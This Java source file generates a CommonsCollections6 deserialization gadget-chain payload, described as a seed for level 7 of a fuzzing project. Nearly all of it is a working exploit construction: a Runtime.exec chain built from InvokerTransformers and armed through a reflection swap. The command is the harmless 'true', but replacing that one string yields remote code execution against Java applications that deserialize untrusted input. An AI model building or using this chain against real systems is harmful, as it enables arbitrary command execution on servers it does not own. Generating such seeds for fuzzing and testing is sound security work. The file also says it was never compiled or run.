import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

/**
 * One-time generator for a real CommonsCollections6 ("CC6") deserialization
 * gadget-chain payload, for VulnJavaFuzzer's level 7. This is the standard,
 * widely-documented ysoserial CC6 construction -- the one specifically
 * known for working across a broad range of JDK versions, unlike CC1/CC3
 * (which the JDK 8u71+ AnnotationInvocationHandler patch broke). The only
 * change from the textbook version: the final command is the harmless
 * "true" rather than anything resembling a real payload.
 *
 * NOT part of the fuzz target itself -- run this once, offline, to produce
 * a seed file, then drop that file into VulnJavaFuzzer_seed_corpus.zip
 * (or straight into the corpus directory). See README, "Level 7 setup".
 *
 * I could not compile or run this specific file myself: it needs
 * commons-collections 3.2.1 on the classpath, and my sandbox has no route
 * to Maven Central to fetch it. Sanity-check the output before trusting it
 * -- see the verification steps in the README.
 *
 * Compile and run once, with commons-collections 3.2.1 on the classpath
 * (Maven already downloaded it into your local repo when you ran `mvn
 * package` on vulnjava-src):
 *
 *   CC=$HOME/.m2/repository/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar
 *   javac -cp "$CC" GenerateDeserializationSeed.java
 *   java -cp ".:$CC" GenerateDeserializationSeed cc6_seed.bin
 */
public class GenerateDeserializationSeed {

    @SuppressWarnings({"unchecked", "rawtypes"})
    public static void main(String[] args) throws Exception {
        String outPath = args.length > 0 ? args[0] : "cc6_seed.bin";
        String harmlessCommand = "true"; // a real command that does nothing and exits 0

        // The real, dangerous chain -- built up front but not wired into the
        // live transformer yet (see below).
        Transformer[] realTransformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{harmlessCommand}),
        };

        // Start the live chain with a harmless placeholder so constructing
        // the object graph below doesn't fire the real chain immediately --
        // it should only fire later, when the serialized bytes are read
        // back by ObjectInputStream.
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        Map outerMap = new HashMap();
        outerMap.put(entry, "foo"); // computes entry.hashCode() now, against the harmless chain
        lazyMap.remove("foo");      // reset lazyMap's inner state for a clean re-trigger on deserialization

        // Swap the harmless placeholder for the real chain now that
        // construction-time hashing is safely done.
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain, realTransformers);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(outerMap);
        }

        try (FileOutputStream fos = new FileOutputStream(outPath)) {
            fos.write(bos.toByteArray());
        }

        System.out.println("Wrote " + bos.size() + " bytes to " + outPath);
        System.out.println("Sanity check: deserializing this file below should run `" + harmlessCommand + "`.");
        System.out.println("If it throws instead of running the command, do not trust this as a seed --");
        System.out.println("see the README troubleshooting note before using it.");

        // Immediate sanity check, in the same JVM, with real commons-collections
        // classes available -- confirms the payload actually fires before you
        // trust it as a seed.
        try (java.io.ObjectInputStream ois =
                     new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(bos.toByteArray()))) {
            ois.readObject();
            System.out.println("Sanity check passed: deserialization completed without error.");
        }
    }
}
